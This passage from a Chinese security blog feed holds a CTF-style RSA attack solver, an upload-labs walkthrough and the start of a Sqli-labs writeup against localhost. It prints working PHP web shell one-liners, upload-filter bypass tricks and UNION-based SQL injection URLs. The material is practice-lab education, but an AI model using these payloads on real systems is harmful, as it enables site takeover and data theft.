class="keyword">def</span> <span class="title">rsa_demo2</span><span class="params">()</span>:</span></span><br><span class="line">    e = <span class="number">3</span>;</span><br><span class="line">    p = <span class="number">4</span>;</span><br><span class="line">    q = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span> ((p % e) == <span class="number">1</span>):</span><br><span class="line">        p = generatePrime(<span class="number">1024</span>); <span class="comment">#产生一个最大为 1024 bit的随机素数</span></span><br><span class="line">    <span class="keyword">while</span> ((q % e) == <span class="number">1</span>):</span><br><span class="line">        q = generatePrime(<span class="number">1024</span>); <span class="comment">#产生一个最大为 1024 bit的随机素数</span></span><br><span class="line">    N = p*q;</span><br><span class="line">    phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">assert</span>((phi%e) != <span class="number">0</span>);</span><br><span class="line">    d = invmod(e, phi);</span><br><span class="line">    message = <span class="number">42</span>;</span><br><span class="line">    encrypted = mypow(message, e, N);</span><br><span class="line">    decrypted = mypow(encrypted, d, N);</span><br><span class="line">    <span class="keyword">assert</span>(message == decrypted);</span><br><span class="line">    rawMessage = <span class="string">b'May the Force be with you'</span></span><br><span class="line">    hexMessage = rawToHex(rawMessage);</span><br><span class="line">    intMessage = int(hexMessage, <span class="number">16</span>);  </span><br><span class="line">    encrypted = mypow(intMessage, e, N);</span><br><span class="line">    decrypted = mypow(encrypted, d, N);</span><br><span class="line">    <span class="keyword">assert</span>(intMessage == decrypted)</span><br><span class="line">    <span class="keyword">assert</span>(hexToRaw(hex(intMessage)[<span class="number">2</span>:]) == rawMessage);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    rsa_demo1();</span><br><span class="line">    rsa_demo2();</span><br><span class="line">    print(<span class="string">"success"</span>)</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>实验三，密码数学挑战赛原题，详见<br>2016密码挑战赛（RSA 加密体制破译）解题过程： <a href="https://blog.csdn.net/yangfan695695/article/details/80648086" target="_blank" rel="noopener">https://blog.csdn.net/yangfan695695/article/details/80648086</a><br>RSA常见攻击方法： <a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/11/06/CTFRSA/index.html</a><br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 <span class="built_in">import</span> *</span><br><span class="line"><span class="built_in">import</span> pyfac</span><br><span class="line"><span class="built_in">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = []</span><br><span class="line"><span class="attr">e</span> = []</span><br><span class="line"><span class="attr">c</span> = []</span><br><span class="line"><span class="attr">m</span> = &#123;&#125;</span><br><span class="line"><span class="attr">one</span> = mpz(<span class="number">1</span>)</span><br><span class="line"><span class="attr">two</span> = mpz(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">def get_m0():</span><br><span class="line">    <span class="attr">e1</span> = mpz(int(e[<span class="number">0</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="attr">e2</span> = mpz(int(e[<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="attr">n_</span> = mpz(int(n[<span class="number">0</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="attr">c1</span> = mpz(int(c[<span class="number">0</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="attr">c2</span> = mpz(int(c[<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="attr">m_</span> = same_moudle(e1,e2,n_,c1,c2)</span><br><span class="line">    m[<span class="string">"0&amp;4"</span>] = hex(m_)[-<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">def china_residue():</span><br><span class="line">    <span class="attr">index_</span> = [<span class="number">12</span>,<span class="number">16</span>,<span class="number">20</span>]</span><br><span class="line">    <span class="attr">c_</span> =&#123;&#125;</span><br><span class="line">    <span class="attr">e_</span> = &#123;&#125;</span><br><span class="line">    <span class="attr">n_</span> = &#123;&#125;</span><br><span class="line">    <span class="attr">Mi</span> = &#123;&#125;</span><br><span class="line">    <span class="attr">M</span> = mpz(<span class="number">1</span>)</span><br><span class="line">    <span class="attr">result</span> = mpz(<span class="number">0</span>)</span><br><span class="line">    for i <span class="keyword">in</span> index_:</span><br><span class="line">        c_[i] = mpz(int(c[i],<span class="number">16</span>))<span class="comment">#int(c[i],16)</span></span><br><span class="line">        n_[i] = mpz(int(n[i],<span class="number">16</span>))</span><br><span class="line">    for i <span class="keyword">in</span> n_.values():</span><br><span class="line">        <span class="attr">M</span> =M* i</span><br><span class="line">    for i <span class="keyword">in</span> index_:</span><br><span class="line">        Mi[i] = M / n_[i]</span><br><span class="line">    for i <span class="keyword">in</span> index_:</span><br><span class="line">        e_[i] = invert(Mi[i],n_[i])</span><br><span class="line">    for i <span class="keyword">in</span> index_:</span><br><span class="line">        result += Mi[i] * e_[i] * c_[i]</span><br><span class="line">    <span class="comment">#print result</span></span><br><span class="line">    <span class="attr">m_</span> = powmod(result,<span class="number">1</span>,M)</span><br><span class="line">    m[<span class="string">"3&amp;8&amp;12&amp;16&amp;20"</span>] = hex(iroot(m_,<span class="number">5</span>)[<span class="number">0</span>])[-<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">a</span> == <span class="number">0</span>:</span><br><span class="line">        return (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, <span class="attr">x</span> = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, <span class="attr">y</span> = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        raise Exception('modular inverse does not exist')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_message():</span><br><span class="line">     for i <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"2/Frame&#123;&#125;"</span>.format(i)) as f:</span><br><span class="line">            <span class="attr">m</span> = f.read()</span><br><span class="line">            n.append(m[:<span class="number">256</span>])</span><br><span class="line">            e.append(m[<span class="number">256</span>:<span class="number">512</span>])</span><br><span class="line">            c.append(m[<span class="number">512</span>:<span class="number">768</span>])</span><br><span class="line"></span><br><span class="line">def same_moudle(e1,e2,n,c1,c2):</span><br><span class="line">    <span class="attr">s2</span> = invert(e2,e1)</span><br><span class="line">    <span class="attr">s1</span> = (one - e2 * s2) / e1</span><br><span class="line">    <span class="attr">tem_result1</span> = pow(modinv(c1,n),-s1,n)</span><br><span class="line">    <span class="attr">tem_result2</span> = pow(c2,s2,n)</span><br><span class="line">    <span class="attr">result</span> = tem_result1 * tem_result2</span><br><span class="line">    <span class="attr">m</span> = powmod(result,<span class="number">1</span>,n)</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">def fractor_crash():</span><br><span class="line">    <span class="attr">index</span> = [<span class="number">1</span>,<span class="number">18</span>]</span><br><span class="line">    <span class="attr">n_</span> = []</span><br><span class="line">    <span class="attr">q_</span> = []</span><br><span class="line">    <span class="attr">et_</span> = []</span><br><span class="line">    <span class="attr">d_</span> = []</span><br><span class="line">    <span class="attr">e_</span> = []</span><br><span class="line">    <span class="attr">c_</span> = []</span><br><span class="line">    <span class="attr">m_</span> = []</span><br><span class="line">    for i <span class="keyword">in</span> index:</span><br><span class="line">        n_.append(mpz(int(n[i],<span class="number">16</span>)))</span><br><span class="line">        e_.append(mpz(int(e[i],<span class="number">16</span>)))</span><br><span class="line">        c_.append(mpz(int(c[i],<span class="number">16</span>)))</span><br><span class="line">    <span class="attr">p</span> = gcd(n_[<span class="number">0</span>],n_[<span class="number">1</span>])</span><br><span class="line">    for i <span class="keyword">in</span> range(len(index)):</span><br><span class="line">        q_.append(n_[i] / p)</span><br><span class="line">        et_.append((q_[i] - one) * (p - one))</span><br><span class="line">        d_.append(invert(e_[i],et_[i]))</span><br><span class="line">        m_.append(hex(powmod(c_[i],d_[i],n_[i]))[-<span class="number">16</span>:])</span><br><span class="line">    m[<span class="string">"1"</span>] = m_[<span class="number">0</span>]</span><br><span class="line">    m[<span class="string">"18"</span>] = m_[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    get_message()</span><br><span class="line">    get_m0() <span class="comment">#0,4 共模攻击</span></span><br><span class="line">    china_residue() <span class="comment">#3,8,12,16,20 低指数广播攻击</span></span><br><span class="line">    fractor_crash() <span class="comment">##1 18 因数碰撞</span></span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;密码学实验&quot;&gt;&lt;a href=&quot;#密码学实验&quot; class=&quot;headerlink&quot; title=&quot;密码学实验&quot;&gt;&lt;/a&gt;密码学实验&lt;/h2&gt;&lt;p&gt;这是现代密码学配套实验，可以在实验中加深对现代密码学的了解，也可以加强自己的编程能力。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="密码学实验" scheme="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>文件上传靶场</title>
    <link href="/2019/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/"/>
    <id>/2019/11/07/文件上传靶场/</id>
    <published>2019-11-07T03:49:50.000Z</published>
    <updated>2019-11-12T03:43:38.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h2><p>整理磁盘的时候莫名其妙发现这个半年前写的blog没发，今天发上来，这是一个比较经典的文件上传靶场，类型比较全。</p><a id="more"></a><p><img src="https://s2.ax1x.com/2019/01/27/ku5SxS.png" alt="image"><br>不知道是因为玄学还是菜刀解析问题，我之前写php马是这样的</p><blockquote><p>&lt;?php eval($_GET[“a”])?&gt;</p></blockquote><p>但是今天发现这样写马根本连不上，菜刀无限返回200，清了N遍缓存也没用，无奈百度和询问dalao，得知应该这样写。</p><blockquote><p>&lt;?php @eval($_GET[“a”])?&gt;</p></blockquote><p>可是@的意思不少抑制报错吗，没有@最多是木马报错，会把菜刀密码暴露出来，这和菜刀的连接我觉得是半毛钱关系也没有。</p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>考点：前端验证绕过</p><p>方法1：</p><p>抓包然后把里面的jpg换成php即可</p><p>方法2：</p><p>利用firefox插件no js，关闭js，直接上传即可</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>考点：Content-Type方式绕过</p><p>讲一句话木马文件后缀改成jpg，然后抓包，把包里的jpg后缀改回php即可，满足了Content-Type的要求</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p>考点：黑名单绕过</p><p>看源码得知，不允许上传<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.asp</span>,<span class="selector-class">.aspx</span>,<span class="selector-class">.php</span>,.jsp</span><br></pre></td></tr></table></figure></p><p>但是过滤这些根本不够，有些后缀不在里面却可以被解析位里面这些。<br>例如：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jsp </span><span class="keyword">jspx </span><span class="keyword">jspf</span></span><br></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">asp aspa cer  aspx</span></span><br></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php php3 php4 php5 phtml</span><br></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exe exee</span></span><br></pre></td></tr></table></figure><p>所以讲上传后缀改为php3 php4 php5 phtml均可以实现传马。</p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p>考点：.htaccess文件绕过</p><p>.htaccess文件是一个配置文件，可以实现改变文件解析配置的作用，但是在windows下重名名不能命名为.htaccess，所以要使用命令行的ren指令才可以。(网上说不行，但是我实测是可以的）（双手挠头？？？）文件内容是</p><blockquote><p>AddType application/x-httpd-php .jpg</p></blockquote><p>意思是把jpg文件当作php来解析，但是.htaccess文件配置只有管理员开启才能使用，默认是关闭的。</p><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>考点：后缀大小写绕过</p><p>也很简单，就算php和Php不一样，但是都会解析成php，改个后缀即可。</p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p>考点：文件后缀（空）绕过</p><p>比如.php和.php 两个后缀是不一样的，后面那个后缀有一个空格，但是由于windows的解析特性，会忽略空格，所以.php 也会解析成php文件</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><p>考点：文件后缀(点)绕过</p><p>和上面那个题类似，由于windows的特性，导致解析文件时会删去文件末尾的一个.，比如.php.会被解析成.php</p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><p>考点：::$DATA（Windows文件流绕过）</p><p>由于NTFS机制，一个文件可以携带多个文件流，但是windows自带的资源管理器只能读取宿主文件，寄宿文件是无法读取的。<br>比如命令</p><blockquote><p>echo abcd&gt;&gt;123.txt</p></blockquote><p>会把abcd写入123.txt中，但是如果命令改成这样</p><blockquote><p>echo abcd&gt;&gt;123.txt:456.txt</p></blockquote><p>abcd会被写入456.txt，但是读取的时候读的是宿主文件123.txt。里面显示为0字节，但是在实际的硬盘存储里，它由于456.txt文件流的存在，实际上是占字节的，那么如何读取b.txt里面的内容呢？</p><blockquote><p>notepad 123.txt:456.txt</p></blockquote><p>那么如果我们不写456.txt而写成::$DATA呢</p><blockquote><p>echo abcd&gt;&gt;123.txt::$DATA</p></blockquote><p>打开会直接显示为abcd，但是应用在文件上传里可以使后缀变得不一样，绕过黑名单检测机制。(也可以用来隐藏一些东西)</p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><p>考点：构造文件后缀绕过</p><p>waf先去除.然后去除空，再去除::$DATA，再黑名单检测有没有php之类的敏感字符。</p><p>我们可以构造后缀.php. .</p><p>那么waf先去除.再去除 ，然后剩下.php.，不在黑名单中，成功过waf</p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><p>考点：双写文件后缀绕过</p><p>waf在检测到php后会将php删去，那我们可以构造后缀pphphp，将中间的php删去之后还留下一个php，这样可以达到文件解析的作用1</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><p>考点：%00截断绕过（GET）</p><p>抓包，发现可以控制save_path在url后面加%00，函数在执行的时候会认为00是字符串末尾，后面将不会再进行处理。</p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><p>考点：%00截断绕过（POST）</p><p>(在post的数据)，后面加（hex）00字符</p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><p>考点：图片马绕过</p><p>找一张小一点的图片，在cmd命令行运行以下命令</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1.</span>jpg/b+<span class="number">2.</span>txt <span class="number">3.</span>jpg</span><br></pre></td></tr></table></figure><p>即可制作图片马，上传即可</p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><p>考点：getimagesize图片类型绕过</p><p>运用上题命令也可绕过</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>考点：php_exif模块图片类型绕过</p><p>看源码是使用exif_imagetype()检查是否为图片文件，依然使用windows的copy命令即可</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><p>考点：二次渲染绕过</p><p>其实还是用copy命令制作的图片马，依然是差不多的。</p><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><p>考点：条件竞争绕过</p><p>服务器是先允许任何文件上传，如果文件是php文件或者其它不允许上传的文件，就会把文件删掉，但是函数执行有一定的时间，使用bp200线程，一边上传，一边访问该文件（以phpinfo举例）当出现较大数据包时，即为成功。</p><h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><p>原理差不多，题目有bug做不了</p><h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><p>考点：move_uploaded_file()截断</p><p>同12题一样，用00绕过即可。</p><h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><p>考点：IIS6.0解析漏洞（一）</p><p>asa,cer,aspx都可以被解析成asp</p><p>见第三题。</p><h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><p>考点：IIS6.0解析漏洞（二）</p><p>比如asp;.jpg会以asp进行解析</p><p>或者asp/.jpg，前面的asp文件会正常解析。</p><h1 id="Pass-22"><a href="#Pass-22" class="headerlink" title="Pass-22"></a>Pass-22</h1><p>考点：IIS6.0解析漏洞（三）</p><p>在图片马后面加上/.php即可成功解析</p><h1 id="Pass-23"><a href="#Pass-23" class="headerlink" title="Pass-23"></a>Pass-23</h1><p>考点：CGI解析漏洞</p><p>asp/1.jpg，可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。<br>这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文件上传靶场&quot;&gt;&lt;a href=&quot;#文件上传靶场&quot; class=&quot;headerlink&quot; title=&quot;文件上传靶场&quot;&gt;&lt;/a&gt;文件上传靶场&lt;/h2&gt;&lt;p&gt;整理磁盘的时候莫名其妙发现这个半年前写的blog没发，今天发上来，这是一个比较经典的文件上传靶场，类型比较全。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="文件上传" scheme="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-lab 1-65关放弃指北</title>
    <link href="/2019/11/02/Sqli/"/>
    <id>/2019/11/02/Sqli/</id>
    <published>2019-11-02T15:30:24.000Z</published>
    <updated>2019-11-12T03:42:31.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Sqli-lab-1-65关放弃指北"><a href="#Sqli-lab-1-65关放弃指北" class="headerlink" title="Sqli-lab 1-65关放弃指北"></a><strong>Sqli-lab</strong> 1-65关放弃指北</h2><p>Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。<br>并且为了方便注入，我在sql语句后加入了</p><blockquote><p>echo $sql;</p></blockquote><p>这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/index.php?id=1</span><br></pre></td></tr></table></figure><p>以上语句是SQli的基本语句，是以id为参数注入的，先写在前面。</p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>一进去，先是一个显示login name和password的页面。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:Dumb</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:Dumb</span></span><br></pre></td></tr></table></figure><p>我们给id加一个单引号看看<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure></p><p>报错，报错提示</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure><p>加上注释符后，不报错，说明应该是字符型注入。</p><p>由于正常渗透测试的时候，是无法看到sql语句的（根本没有报错信息好吗），所以我们加入的echo仅供参考，具体分析从报错信息分析。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-<span class="literal">master</span>/Less-<span class="number">1</span>/index.php?<span class="attr">id=</span><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p>有三个字段，查一下表名看看（已经判断过2，3为显示位）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:emails</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:3</span></span><br></pre></td></tr></table></figure><p>这样一个个查询效率可能有点低，可以把两个显示位均利用起来。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:emails</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:referers</span></span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">2</span><span class="regexp">/index.php?id=1--+</span></span><br></pre></td></tr></table></figure><p>正常，说明是正常的数字型注入，同Less-1，注入表名。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/<span class="keyword">index</span>.php?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>--+</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">3</span><span class="regexp">/index.php?id=1')--+</span></span><br></pre></td></tr></table></figure><p>是基于’)的注入，注入出表名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/index.php?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure><p>以上两条语句均不报错，那么我们试试”</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span 